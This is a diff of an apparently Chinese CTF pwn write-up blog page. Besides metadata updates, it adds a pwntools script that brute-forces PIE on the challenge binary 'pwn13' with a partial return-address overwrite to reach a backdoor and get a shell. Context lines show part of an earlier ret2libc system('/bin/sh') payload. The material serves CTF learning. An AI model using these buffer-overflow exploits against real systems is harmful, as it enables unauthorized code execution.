@@ -391,14 +391,14 @@ from LibcSearch">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.8k
+                        2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        9 分
+                        10 分
                     </div>
                     
                 
@@ -648,6 +648,28 @@ payload2 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(binsh_addr) + p64(syste
 r.recvuntil(&quot;Let&#39;s start a game,can you guess the key?\n&quot;)
 r.sendline(payload2)
 r.interactive()
+
+</code></pre><h3 id="一苇"><a href="#一苇" class="headerlink" title="一苇"></a>一苇</h3><p>这个题目开了pie但是给了后门，那几本断定是简单的pie爆破了，无奈python水平还好像不太可以，这个脚本可以直接帮助我们getshell , 但是只后你想关这个linux 终端可能必须用鼠标点那个 X 了，用不了快捷键。。。。无语奥。。。谁有更好的办法可以call我啊，当然1/16的几率，手动也可以。</p>
+<pre><code>#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+import random
+offset = 32 + 8
+list1 = [&quot;\x0a&quot;,&quot;\x1a&quot;,&quot;\x2a&quot;,&quot;\x3a&quot;,&quot;\x4a&quot;,&quot;\x5a&quot;,&quot;\x6a&quot;,&quot;\x7a&quot;,&quot;\x8a&quot;,&quot;\x9a&quot;,&quot;\xaa&quot;,&quot;\xba&quot;,&quot;\xca&quot;,&quot;\xda&quot;,&quot;\xea&quot;,&quot;\xfa&quot;]
+while True:
+    try:
+        r = process(&#39;./pwn13&#39;)
+        r.recvuntil(&#39;your choice:&#39;)
+        r.sendline(&#39;1&#39;)
+        r.recvuntil(&#39;input massage\n&#39;)
+        payload = offset * &#39;a&#39; + &#39;\x50&#39; + random.sample(list1,1)[0]
+        r.sendline(payload)
+        r.recv()
+        r.recv()
+        r.interactive()
+    except Exception as e:
+        r.close()
+        print e
 
 </code></pre>
             </div>
@@ -978,7 +1000,7 @@ fastbin: Chunk Size &lt;= get_max_fast()的chunk（其实就是64bits的是128by
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">10.4k</span>
+                <span class="white-color">10.6k</span>
             
 
             
